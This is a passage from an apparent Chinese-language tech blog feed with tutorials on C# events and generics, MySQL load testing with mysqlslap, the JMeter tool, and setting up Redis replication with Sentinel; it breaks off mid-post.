class="line"></span><br><span class="line">    <span class="comment">// 触发事件的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">OnReached</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Reached?.Invoke(<span class="keyword">this</span>, EventArgs.Empty);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用事件<br>接下来，我们将在主程序中创建 Counter 类的实例，并订阅其 Reached 事件。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> counter = <span class="keyword">new</span> Counter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 订阅事件</span></span><br><span class="line">        counter.Reached += Counter_Reached;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟增加计数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            counter.Increment();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 事件处理方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Counter_Reached</span>(<span class="params"><span class="built_in">object</span> source, EventArgs e</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;The count has reached the limit!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，每当计数器的值达到5时，就会触发 Reached 事件。订阅了此事件的对象将接收到通知，并可以执行相应的操作。在这个例子中，我们的主程序订阅了这个事件，并定义了一个事件处理方法 Counter_Reached，该方法会在事件被触发时输出一条消息。</p><p>这是一个非常基础的示例，实际应用中事件可以携带更多的信息，例如通过自定义的事件参数类来传递数据给事件处理方法。</p><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><p>泛型允许 在定义方法、类或接口时不指定具体的类型，而是在使用的时候再指定。这样可以提高代码的复用性和类型安全性。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Box</span>&lt;<span class="title">T</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> T item;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Box</span>(<span class="params">T item</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.item = item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">GetItem</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> item;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用示例</span></span><br><span class="line">Box&lt;<span class="built_in">string</span>&gt; stringBox = <span class="keyword">new</span> Box&lt;<span class="built_in">string</span>&gt;(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> content = stringBox.GetItem();</span><br><span class="line">Console.WriteLine(content);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Reflection&quot;&gt;&lt;a href=&quot;#Reflection&quot; class=&quot;headerlink&quot; title=&quot;Reflection&quot;&gt;&lt;/a&gt;Reflection&lt;/h1&gt;&lt;p&gt;反射&lt;br&gt;动态加载和创建对象：&lt;br&gt;反射可以在运行时加载程序集，并基于类</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="c#" scheme="https://banjinmei.github.io/tags/c/"/>
    
    <category term=".NET" scheme="https://banjinmei.github.io/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>mysql 压测</title>
    <link href="https://banjinmei.github.io/2024/11/22/sql-%E5%8E%8B%E6%B5%8B/"/>
    <id>https://banjinmei.github.io/2024/11/22/sql-%E5%8E%8B%E6%B5%8B/</id>
    <published>2024-11-22T14:55:35.000Z</published>
    <updated>2024-11-29T19:08:14.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysqlslap"><a href="#mysqlslap" class="headerlink" title="mysqlslap"></a>mysqlslap</h1><p>是 MySQL 自带的一个用于模拟负载和测试数据库性能的命令行工具。它可以帮助开发者或数据库管理员了解在不同操作模式下数据库的表现情况，从而优化数据库配置或查询语句。<br>使用方法</p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlslap [options]</span><br></pre></td></tr></table></figure><p>常用选项<br>–auto-generate-sql: 自动生成 SQL 测试数据，默认为开启状态。<br>–concurrency&#x3D;thread_count: 指定并发线程数，例如 –concurrency&#x3D;50 表示创建 50 个并发连接。<br>–iterations&#x3D;count: 指定测试迭代次数，即执行多少轮测试。<br>–create-schema&#x3D;schema_name: 创建并使用指定的 schema 进行测试。<br>–query&#x3D;query_file: 使用文件中的 SQL 语句进行测试。<br>–auto-generate-sql-add-auto-increment: 对自动生成的表添加自动增长字段。<br>–auto-generate-sql-load-type&#x3D;type: 指定测试的数据加载类型，可以是 insert, update, delete, select 或 mixed。<br>–number-of-queries&#x3D;value: 当使用 –auto-generate-sql 参数时，设置每个线程执行的查询数量。<br>–engine&#x3D;engine_name: 指定存储引擎，如 InnoDB、MyISAM 等。<br>示例</p><h1 id="基本压力测试："><a href="#基本压力测试：" class="headerlink" title="基本压力测试："></a>基本压力测试：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlslap --concurrency=10 --iterations=3 --auto-generate-sql --engine=InnoDB</span><br></pre></td></tr></table></figure><p>这条命令将启动一个使用 InnoDB 存储引擎的压力测试，使用 10 个并发连接，执行 3 轮测试，并自动生成 SQL 语句。<br>自定义查询的压力测试：<br>如果你有一个包含多个 SQL 语句的文件 test_queries.sql，可以这样使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlslap --concurrency=5 --iterations=2 --query=test_queries.sql</span><br></pre></td></tr></table></figure><p>此命令将使用 5 个并发连接，执行 2 轮测试，使用 test_queries.sql 文件中定义的 SQL 语句。</p><h1 id="混合操作的压力测试："><a href="#混合操作的压力测试：" class="headerlink" title="混合操作的压力测试："></a>混合操作的压力测试：</h1><p>若要测试插入、更新、删除和选择操作的混合负载，可以这样做：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlslap --concurrency=20 --iterations=1 --auto-generate-sql --auto-generate-sql-load-type=mixed --number-of-queries=1000</span><br></pre></td></tr></table></figure><p>这将启动一个混合操作的测试，使用 20 个并发连接，执行一次迭代，总共执行 1000 条随机生成的 SQL 语句。</p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>在进行压力测试前，请确保备份重要数据，避免测试过程中对生产环境造成影响。<br>测试结果会受到服务器硬件性能、MySQL 配置参数等多种因素的影响，因此测试环境应尽量接近生产环境。<br>分析测试结果时，注意查看错误信息，以便及时发现潜在的问题。</p><p>插入数据<br>执行如下命令实现数据插入，为提高效率这里开启 10 个客户端线程同时插入，总共执行 1 百万次操作：</p><p>mysqlslap -uroot -p 123123.zxcvb –concurrency&#x3D;10 –number-of-queries&#x3D;1000000 –create-schema&#x3D;IMDB–query&#x3D;”INSERT INTO people(name,age) VALUES (uuid(), RAND() * 100)”</p><h1 id="对user表进行-100000-插入测试"><a href="#对user表进行-100000-插入测试" class="headerlink" title="对user表进行 100000 插入测试"></a>对user表进行 100000 插入测试</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_username</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_lowercase) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_email</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;generate_username()&#125;</span>@example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;insert_data.sql&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">        username = generate_username()</span><br><span class="line">        email = generate_email()</span><br><span class="line">        f.write(<span class="string">f&quot;INSERT INTO User (username, email) VALUES (&#x27;<span class="subst">&#123;username&#125;</span>&#x27;, &#x27;<span class="subst">&#123;email&#125;</span>&#x27;);\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>python 生成insert_data sql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlslap --concurrency=50 --iterations=1 --create-schema=test_db --query=insert_data.sql</span><br></pre></td></tr></table></figure><p>–concurrency&#x3D;50：使用 50 个并发连接。<br>–iterations&#x3D;1：执行一次迭代。<br>–create-schema&#x3D;test_db：创建并使用 test_db 数据库。<br>–query&#x3D;insert_data.sql：使用 insert_data.sql 文件中的 SQL 语句。</p><!-- https://blog.csdn.net/naisiing/article/details/135677935mysql 压测 -->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;mysqlslap&quot;&gt;&lt;a href=&quot;#mysqlslap&quot; class=&quot;headerlink&quot; title=&quot;mysqlslap&quot;&gt;&lt;/a&gt;mysqlslap&lt;/h1&gt;&lt;p&gt;是 MySQL 自带的一个用于模拟负载和测试数据库性能的命令行工具。它可以帮助开发者</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="mysql" scheme="https://banjinmei.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>Jmeter 压测工具</title>
    <link href="https://banjinmei.github.io/2024/11/22/Jmeter-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7/"/>
    <id>https://banjinmei.github.io/2024/11/22/Jmeter-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7/</id>
    <published>2024-11-22T14:53:27.000Z</published>
    <updated>2024-11-22T14:54:54.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JMeter"><a href="#JMeter" class="headerlink" title="JMeter"></a>JMeter</h1><p>下载地址： Apache JMeter<br><a class="link"   href="https://jmeter.apache.org/download_jmeter.cgi" >https://jmeter.apache.org/download_jmeter.cgi<i class="fas fa-external-link-alt"></i></a></p><p>选择二进制包下载后解压，双击&#x2F;bin&#x2F;jmeter.bat<br>（依赖java环境）</p><h1 id="语言设置"><a href="#语言设置" class="headerlink" title="语言设置"></a>语言设置</h1><p>可以在Options&#x2F;Choose Language将语言设置为中文</p><h1 id="创建线程组"><a href="#创建线程组" class="headerlink" title="创建线程组"></a>创建线程组</h1><p>右键Test Plan<br>Test Plan-&gt;添加-&gt;线程（用户）-&gt;线程组</p><p>名称：线程组名称<br>注释（可选设置）<br>线程数：可以用作是用户数，即多少个同时并发向API发送请求<br>Ramp-Up时间：在设定的时间内启动上面设置的线程数<br>循环次数：即一个线程发送设定的请求，可以勾选永远，这样线程就会一直发送API请求</p><h1 id="添加HTTP请求"><a href="#添加HTTP请求" class="headerlink" title="添加HTTP请求"></a>添加HTTP请求</h1><p>右键线程组<br>线程组-&gt;添加-&gt;取样器-&gt;HTTP请求</p><h1 id="设置HTTP请求"><a href="#设置HTTP请求" class="headerlink" title="设置HTTP请求"></a>设置HTTP请求</h1><p>名称：接口名称<br>注释（可选）<br>协议：http&#x2F;https<br>服务器名称或IP：服务器域名或IP地址<br>端口号：web程序监听的端口号<br>请求方法：GET&#x2F;POST&#x2F;…<br>路径：API接口路径</p><h1 id="添加HTTP请求头"><a href="#添加HTTP请求头" class="headerlink" title="添加HTTP请求头"></a>添加HTTP请求头</h1><p>右键线程组<br>线程组-&gt;添加-&gt;配置元件-&gt;HTTP信息头</p><p>设置接口的HTTP请求头</p><h1 id="添加监听器"><a href="#添加监听器" class="headerlink" title="添加监听器"></a>添加监听器</h1><p>查看结果树：可以查看请求响应是否成功，也可以看到响应内存</p><p>线程组-&gt;添加-&gt;监听器-&gt;查看结构树</p><h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><h1 id="线程组-添加-取样器-TCP取样器"><a href="#线程组-添加-取样器-TCP取样器" class="headerlink" title="线程组-&gt;添加-&gt;取样器-&gt; TCP取样器"></a>线程组-&gt;添加-&gt;取样器-&gt; TCP取样器</h1><p>SERVER IP  端口  发送文本</p><h1 id="java环境"><a href="#java环境" class="headerlink" title="java环境"></a>java环境</h1><p>在Windows上安装Java环境通常涉及到两个主要步骤：安装Java运行环境（JRE）或开发工具包（JDK），以及设置环境变量。以下是详细的步骤说明：</p><h2 id="1-下载JDK"><a href="#1-下载JDK" class="headerlink" title="1. 下载JDK"></a>1. 下载JDK</h2><p>首先，需要从Oracle官网或其他可信的来源下载最新的JDK版本。访问Oracle JDK下载页面，<br><a class="link"   href="https://www.oracle.com/java/technologies/downloads/#java17" >https://www.oracle.com/java/technologies/downloads/#java17<i class="fas fa-external-link-alt"></i></a></p><p>选择适合的操作系统的版本进行下载。注意，页面上的链接可能会随着新版本的发布而变化。</p><h2 id="2-安装JDK"><a href="#2-安装JDK" class="headerlink" title="2. 安装JDK"></a>2. 安装JDK</h2><p>双击下载好的安装文件开始安装过程。<br>在安装过程中，可以选择自定义安装路径。建议选择一个容易记住的位置，比如 C:\Program Files\Java\jdk-xx（其中 xx 是安装的JDK版本号）。<br>按照提示完成安装。</p><h2 id="3-设置环境变量"><a href="#3-设置环境变量" class="headerlink" title="3. 设置环境变量"></a>3. 设置环境变量</h2><p>为了能够在命令行中任意位置使用 java 和 javac 命令，需要配置系统环境变量。</p><p>打开系统属性：<br>右键点击“此电脑”或“我的电脑”，选择“属性”。<br>点击“高级系统设置”。<br>在“高级”选项卡下，点击“环境变量”。<br>设置JAVA_HOME：<br>在“系统变量”部分，点击“新建”，然后添加变量名为 JAVA_HOME。<br>将变量值设为JDK的安装目录，例如 C:\Program Files\Java\jdk-xx。<br>修改Path变量：<br>找到并选中“系统变量”中的 Path 变量，然后点击“编辑”。<br>添加一个新的条目，其值为 %JAVA_HOME%\bin。这使得系统可以在任何地方识别 java 和 javac 命令。</p><h2 id="4-验证安装"><a href="#4-验证安装" class="headerlink" title="4. 验证安装"></a>4. 验证安装</h2><p>打开命令提示符（CMD），输入以下命令来验证安装是否成功：</p><p>输入 java -version 查看Java版本信息。<br>输入 javac -version 查看Java编译器版本信息。<br>如果能够正确显示版本信息，则表示Java环境已经成功安装并且配置正确。</p><!-- https://blog.csdn.net/weixin_73622063/article/details/143834672 -->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JMeter&quot;&gt;&lt;a href=&quot;#JMeter&quot; class=&quot;headerlink&quot; title=&quot;JMeter&quot;&gt;&lt;/a&gt;JMeter&lt;/h1&gt;&lt;p&gt;下载地址： Apache JMeter&lt;br&gt;&lt;a class=&quot;link&quot;   href=&quot;https:/</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="jmeter" scheme="https://banjinmei.github.io/tags/jmeter/"/>
    
    <category term="jvav" scheme="https://banjinmei.github.io/tags/jvav/"/>
    
  </entry>
  
  <entry>
    <title>redis sentinel cluster</title>
    <link href="https://banjinmei.github.io/2024/11/22/redis-sentinel-cluster/"/>
    <id>https://banjinmei.github.io/2024/11/22/redis-sentinel-cluster/</id>
    <published>2024-11-22T14:18:29.000Z</published>
    <updated>2024-11-22T14:37:47.028Z</updated>
    
    <content type="html"><![CDATA[<p> Debian 服务器上部署分布式 Redis 可以实现高可用性或负载均衡，具体可以选择以下两种方案之一：</p><p>主从复制 (Master-Slave Replication)<br>主从复制用于数据冗余备份和读写分离，但并不提供自动故障切换功能。</p><h1 id="Redis-Sentinel-哨兵模式"><a href="#Redis-Sentinel-哨兵模式" class="headerlink" title="Redis Sentinel (哨兵模式)"></a>Redis Sentinel (哨兵模式)</h1><p>Redis Sentinel 在主从复制的基础上增加了自动故障切换功能，用于实现高可用性。</p><h1 id="Redis-Cluster-集群模式"><a href="#Redis-Cluster-集群模式" class="headerlink" title="Redis Cluster (集群模式)"></a>Redis Cluster (集群模式)</h1><p>Redis Cluster 是一种分布式部署方式，支持数据分片和高可用性，适用于需要扩展性的场景。</p><h1 id="Redis-Sentinel-部署架构"><a href="#Redis-Sentinel-部署架构" class="headerlink" title="Redis Sentinel 部署架构"></a>Redis Sentinel 部署架构</h1><p>两台服务器：<br>主 Redis 服务器（假设 IP：192.168.1.101）<br>从 Redis 服务器（假设 IP：192.168.1.102）<br>Sentinel 哨兵进程：<br>每台服务器运行一个 Sentinel 进程，用于监控和故障切换。</p><h2 id="步骤-1：安装-Redis"><a href="#步骤-1：安装-Redis" class="headerlink" title="步骤 1：安装 Redis"></a>步骤 1：安装 Redis</h2><p>在两台服务器上分别安装 Redis：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install redis-server</span><br></pre></td></tr></table></figure><p>验证 Redis 版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server --version</span><br></pre></td></tr></table></figure><h2 id="步骤-2：配置-Redis-主从复制"><a href="#步骤-2：配置-Redis-主从复制" class="headerlink" title="步骤 2：配置 Redis 主从复制"></a>步骤 2：配置 Redis 主从复制</h2><p>在主服务器 (192.168.1.101) 上<br>编辑 Redis 配置文件 &#x2F;etc&#x2F;redis&#x2F;redis.conf：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0           <span class="comment"># 允许外部访问</span></span><br><span class="line">protected-mode no      <span class="comment"># 关闭保护模式（测试环境使用）</span></span><br><span class="line">appendonly <span class="built_in">yes</span>         <span class="comment"># 开启持久化</span></span><br></pre></td></tr></table></figure><p>启动 Redis 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis</span><br></pre></td></tr></table></figure><p>在从服务器 (192.168.1.102) 上<br>编辑 Redis 配置文件 &#x2F;etc&#x2F;redis&#x2F;redis.conf：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line">protected-mode no</span><br><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置为主服务器的从节点</span></span><br><span class="line">replicaof 192.168.1.101 6379</span><br></pre></td></tr></table></figure><p>启动 Redis 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis</span><br></pre></td></tr></table></figure><p>验证主从复制<br>在主服务器上设置一个测试键：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br><span class="line"><span class="built_in">set</span> mykey <span class="string">&quot;hello_redis&quot;</span></span><br></pre></td></tr></table></figure><p>在从服务器上读取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br><span class="line">get mykey</span><br><span class="line"><span class="comment"># 返回 &quot;hello_redis&quot;</span></span><br></pre></td></tr></table></figure><h2 id="步骤-3：配置-Redis-Sentinel"><a href="#步骤-3：配置-Redis-Sentinel" class="headerlink" title="步骤 3：配置 Redis Sentinel"></a>步骤 3：配置 Redis Sentinel</h2><p>在两台服务器上配置 Redis Sentinel。Redis 自带 Sentinel 二进制文件，不需要额外安装。</p><p>配置主服务器的 Sentinel<br>编辑 &#x2F;etc&#x2F;redis&#x2F;sentinel.conf：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0                        <span class="comment"># 允许外部访问</span></span><br><span class="line">protected-mode no                   <span class="comment"># 关闭保护模式（测试环境使用）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监控主节点，设置 quorum 为 2</span></span><br><span class="line">sentinel monitor mymaster 192.168.1.101 6379 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果主节点在 5 秒内无响应，则认为其失效</span></span><br><span class="line">sentinel down-after-milliseconds mymaster 5000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置故障切换的超时时间</span></span><br><span class="line">sentinel failover-timeout mymaster 10000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果主节点有密码，需添加以下配置</span></span><br><span class="line"><span class="comment"># sentinel auth-pass mymaster &lt;password&gt;</span></span><br></pre></td></tr></table></figure><p>配置从服务器的 Sentinel<br>在从服务器上，配置 &#x2F;etc&#x2F;redis&#x2F;sentinel.conf，内容与主服务器一致。</p><h2 id="步骤-4：启动-Redis-Sentinel"><a href="#步骤-4：启动-Redis-Sentinel" class="headerlink" title="步骤 4：启动 Redis Sentinel"></a>步骤 4：启动 Redis Sentinel</h2><p>在两台服务器上启动 Sentinel：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis/sentinel.conf --sentinel</span><br></pre></td></tr></table></figure><p>检查是否启动成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure><p>应该能看到 Redis Sentinel 进程运行。</p><h2 id="步骤-5：测试高可用性"><a href="#步骤-5：测试高可用性" class="headerlink" title="步骤 5：测试高可用性"></a>步骤 5：测试高可用性</h2><p>模拟主节点故障<br>在主服务器上停止 Redis 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop redis</span><br></pre></td></tr></table></figure><p>Sentinel 检测到主节点不可用后，会自动将从节点（192.168.1.102）提升为主节点。</p><p>验证故障切换<br>在 Sentinel 中查看新的主节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 26379</span><br><span class="line">SENTINEL get-master-addr-by-name mymaster</span><br></pre></td></tr></table></figure><p>应返回从节点的 IP 和端口（192.168.1.102:6379）。</p><p>恢复主节点<br>启动主节点服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start redis</span><br></pre></td></tr></table></figure><p>主节点会自动成为新的从节点，重新加入集群。</p><p>附加：常用命令<br>查看 Sentinel 监控的所有节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 26379</span><br><span class="line">SENTINEL masters</span><br></pre></td></tr></table></figure><p>查看特定主节点的所有从节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 26379</span><br><span class="line">SENTINEL slaves mymaster</span><br></pre></td></tr></table></figure><p>手动触发故障切换：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 26379</span><br><span class="line">SENTINEL failover mymaster</span><br></pre></td></tr></table></figure><p>部署总结<br>Redis Sentinel 实现了主从复制的监控和自动故障切换，其核心是：</p><p>主节点负责写操作，从节点提供读操作。<br>Sentinel 检测主节点是否不可用，并自动将从节点提升为主节点。<br>整个系统实现了高可用性，无需人工干预。</p><p><strong>三台服务器</strong></p><p>假设有三台服务器：</p><p>主节点（Master）：192.168.1.101<br>从节点1（Replica1）：192.168.1.102<br>从节点2（Replica2）：192.168.1.103<br>每台服务器同时运行 Redis 和 Sentinel。</p><h2 id="1-安装-Redis"><a href="#1-安装-Redis" class="headerlink" title="1. 安装 Redis"></a>1. 安装 Redis</h2><p>在所有服务器上安装 Redis：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install redis-server</span><br></pre></td></tr></table></figure><p>验证 Redis 安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server --version</span><br></pre></td></tr></table></figure><h2 id="2-配置主从复制"><a href="#2-配置主从复制" class="headerlink" title="2. 配置主从复制"></a>2. 配置主从复制</h2><p>主节点配置（192.168.1.101）<br>编辑 &#x2F;etc&#x2F;redis&#x2F;redis.conf：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line">protected-mode no</span><br><span class="line">appendonly <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><p>启动 Redis 主节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis</span><br></pre></td></tr></table></figure><p>从节点配置（192.168.1.102 和 192.168.1.103）<br>编辑 &#x2F;etc&#x2F;redis&#x2F;redis.conf：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line">protected-mode no</span><br><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置为从节点，指向主节点 IP 和端口</span></span><br><span class="line">replicaof 192.168.1.101 6379</span><br></pre></td></tr></table></figure><p>启动 Redis 从节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>验证主从同步<br>在主节点上插入数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br><span class="line">SET test_key <span 